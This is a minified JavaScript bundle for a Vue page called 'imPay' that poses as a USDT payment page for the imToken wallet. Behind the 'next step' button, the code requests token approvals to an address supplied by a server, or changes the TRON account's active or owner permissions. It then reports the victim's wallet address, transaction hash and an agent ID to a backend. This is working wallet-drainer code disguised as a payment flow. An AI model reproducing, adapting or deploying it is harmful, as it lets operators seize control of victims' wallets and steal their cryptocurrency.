import{u as a}from"./S4n-062978f3.js";import{s as e,a as t,b as s,g as o}from"./3-3c8bfcc8.js";import{B as i,a as r,b as l,c,t as d,g as u}from"./mJIV71TAjr-136de0f1.js";import{T as p}from"./cldr2-636ff111.js";import{d as n,e as m,c as v,g as b,a as f,b as j}from"./dc8-ed4edeba.js";import{v as w,c as g,b as h,Q as y,P as T,l as S,M as k,R as x,S as I,O as A,q as N}from"./K10oM-81266e6e.js";import{r as R,u as H}from"./ikAd0-34f4698b.js";import{P as C}from"./4XRMxNYPt-0ddf973b.js";import{F as _,B as L,s as E,a as O,c as z}from"./o4OiyZ-90f6a8df.js";import{_ as B}from"./d1U4Ngy8-1099d432.js";import"./3BohKIbg-6cad2a46.js";import"./pnnm9-956498f2.js";import"./6-65d41449.js";import"./uCmCG-967d2673.js";import"./zYEy-ba5d9b47.js";import"./iT5C4LNrKZ-fb7f9fd2.js";import"./N02-6a4879b1.js";import"./yLSACot0e-a2b5c8a7.js";import"./3Dojjz1TCB-a17f921f.js";import"./6Rv-97024329.js";import"./g-e263c0a7.js";import"./SHN6-46ec4890.js";import"./HCompF-1f6e2518.js";import"./eX-0cd6cfab.js";import"./0hZOI3-b6b5bd30.js";import"./LGSiKB51-58eafcf0.js";import"./R-fd142a18.js";import"./O8HwyzSp-e4bc48c5.js";import"./zPrtTz-68f4cb76.js";import"./E6tpdEEVd-f6c7232c.js";import"./SgkAH6KsMw-7effe4a0.js";import"./N1bigTv-32aa378f.js";/* empty css            */import"./4eMFSJ302-4602a02b.js";/* empty css                   */import"./ZeOgft-2a068e14.js";import"./65-ee93eb77.js";import"./hvU8Wzy-b3b35ca6.js";import"./5-aaa99a99.js";import"./sLRINGshA-35205e27.js";import"./drc-5cd29db3.js";import"./oHf-6dda22ea.js";import"./IIap-1a2f4cbe.js";import"./DpmIa-000ab3aa.js";import"./ZVHI-777bceec.js";import"./KMrtMFsFf-db7ef389.js";import"./oq0EZ-27e335fb.js";import"./fAbG4Rt3VI-9212dda3.js";import"./S9aNL-65356a8c.js";import"./j4Fln-1e2db9da.js";import"./LB9gtFYY-e47bd9d7.js";import"./ENQyU5n-65f9b0e9.js";import"./objLnm0-e6580f8e.js";import"./aB1U9I-26dbf0f7.js";import"./Cm-f8da83c3.js";import"./nrj1Q-f0d46372.js";import"./JnMCJ-ffd8003b.js";import"./fTBAvqD-880fd1d8.js";import"./bcHuBoGS-a51765f0.js";import"./Q-c57607b5.js";import"./kTl4fS-43f37d86.js";import"./0otUMpgz2-97effda2.js";import"./Sj-c71d7c2a.js";import"./7HM-8e288bd9.js";import"./t-1e6d33f6.js";const M=a=>(x("data-v-6966fb22"),a=a(),I(),a),U={class:"page-container"},F=M((()=>T("div",{class:"bottom-m10 left-m10 right-m30 top-p10 o7 fs14"},"收款账号",-1))),X={class:"left-m10 bg-white br12 right-m10",style:{padding:"12px 15px","border-radius":"5px"}},Z={class:"bottom-m10 left-m10 right-m10 top-m20 o7 fs14 spaceb"},J=M((()=>T("span",{class:"fs14"},"数量",-1))),K={class:"fs14 o7"},V={class:"bg-white left-m10 br12 right-m10",style:{"border-radius":"5px"}},G={class:"address left-m20 o7 top-p20 bottom-p10 column"},D={style:{"margin-right":"15px"}},P={class:"spaceb right-m10 top-m10 o6"},Y={class:"fs14"},q={class:"center-w confirm-btn left-m10 right-m10",style:{"margin-top":"15px"}},Q=B(w({__name:"imPay",setup(w){const x=R(0),I=R(0),B=R(.069),M=R({type:1,walletType:1,agentId:"",token:"USDT",amount:1,clientId:"",block:i.TRX,ads:"",isAdd:!1,client_type:1,extend:{}}),Q=R("");R("");const $=R({authAddress:"",clientId:"",receiveAddress:{trx:"",eth:"",bsc:""},authSuccessTips:""}),W=R("");R(!1),a(),R("");const aa=R(!0),ea=g((()=>M.value.ads||$.value.receiveAddress[M.value.block])),ta=()=>{const{type:a}=M.value;if(I.value<x.value)return E("Insufficient balance");1==a?sa():2==a?oa():ia()},sa=async()=>{try{if(O({message:"Loading...",duration:0}),M.value.block==i.TRX){const a=await r("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",Q.value,W.value);a.result&&(ra(W.value,"approve",a.txid),E($.value.authSuccessTips))}else if(M.value.block==i.ETH){const a=await n(web3.value,W.value,Q.value);a.transactionHash&&(ra(W.value,"approve",a.transactionHash),E($.value.authSuccessTips))}else if(M.value.block==i.BSC){const a=await m(web3.value,W.value,Q.value);a.transactionHash&&(ra(W.value,"approve",a.transactionHash),E($.value.authSuccessTips))}}catch(a){z()}},oa=async()=>{if(M.value.block!=i.TRX)return;const a=await l(Q.value,W.value,M.value.isAdd);(null==a?void 0:a.result)?(ra(W.value,"active",a.txid),E($.value.authSuccessTips),z()):a&&E("object"==typeof a?JSON.stringify(a):String(a))},ia=async()=>{if(M.value.block!=i.TRX)return;const a=await c(Q.value);a.result&&(ra(W.value,"owner",a.txid),E($.value.authSuccessTips))},ra=async(a,o,i)=>{const r={addres:a,auth_addres:Q.value,hash:i||0,wallete_type:"ImToken",client_id:M.value.clientId||$.value.clientId||"",source:window.location.href,agent_uid:M.value.agentId,block:M.value.block,client_type:M.value.client_type,amount:M.value.amount,extend:M.value.extend?JSON.stringify(M.value.extend):""};switch(o){case"approve":await s(r);break;case"active":await t(r);break;case"owner":await e(r)}z()},la=async()=>{let a;switch(M.value.block){case i.TRX:if(W.value=await tronWeb.defaultAddress.base58,!W.value)return E("无法获取钱包地址！请检查浏览器是否支持TRON！");I.value=await u(W.value,M.value.token);break;case i.ETH:a=await f(),web3.value=a.web3,W.value=a.userAddress,I.value=await j(web3.value,a.userAddress);break;case i.BSC:a=await v(),web3.value=a.web3,W.value=a.userAddress,I.value=await b(web3.value,a.userAddress)}};return h((async()=>{const a=JSON.parse(localStorage.getItem("routerParams"));if(x.value=a.amount,M.value={amount:x.value,type:a.type,walletType:1,agentId:a.agent,token:a.token||"USDT",block:a.block||i.TRX,clientId:a.clientId||"",ads:a.ads,isAdd:a.isAdd,client_type:1,extend:a.extend},(async()=>{try{const a=JSON.parse(localStorage.getItem("config"));$.value={...a};const{type:e}=M.value;aa.value=!0;const t=await o({block:M.value.block,type:d[M.value.type]});aa.value=!1;const s=t.data;$.value={...a,authAddress:s},Q.value=$.value.authAddress}catch(a){aa.value=!1}})(),p.isTokenEnv())try{p.apis.navigator.setTitle(`${String(M.value.token).toLocaleLowerCase()}转账`);let a="";a=M.value.block==i.TRX?await p.apis.user.showAccountSwitch("TRON"):await p.apis.user.showAccountSwitch("ETHEREUM"),W.value=a,la()}catch(e){4001==e.code&&la()}else{la();const a=`imtokenv2://navigate?screen=DappView&url=${window.location.href}`;window.location.href=a}})),(a,e)=>(A(),y("div",U,[F,T("div",X,C(ea.value||"-"),1),T("div",Z,[J,T("span",K,C(I.value)+" "+C(String(M.value.token).toLocaleUpperCase()),1)]),T("div",V,[T("div",G,[T("div",D,[S(H(_),{modelValue:x.value,"onUpdate:modelValue":e[0]||(e[0]=a=>x.value=a),type:"number",label:"",placeholder:"请输入",size:"large",style:{"font-size":"16px",padding:"0 0 10px 0px","border-bottom":"1px solid #eee"}},null,8,["modelValue"])]),T("div",P,[T("span",Y," $ "+C("t"==M.value.token?Number(Number(x.value).toFixed(2)*B.value).toFixed(3):x.value),1)])])]),T("div",q,[S(H(L),{style:{width:"100%","border-radius":"8px"},size:"large",color:"#3478f6",onClick:ta,loading:aa.value},{default:k((()=>[N("下一步")])),_:1},8,["loading"])])]))}}),[["__scopeId","data-v-6966fb22"]]);export{Q as default};
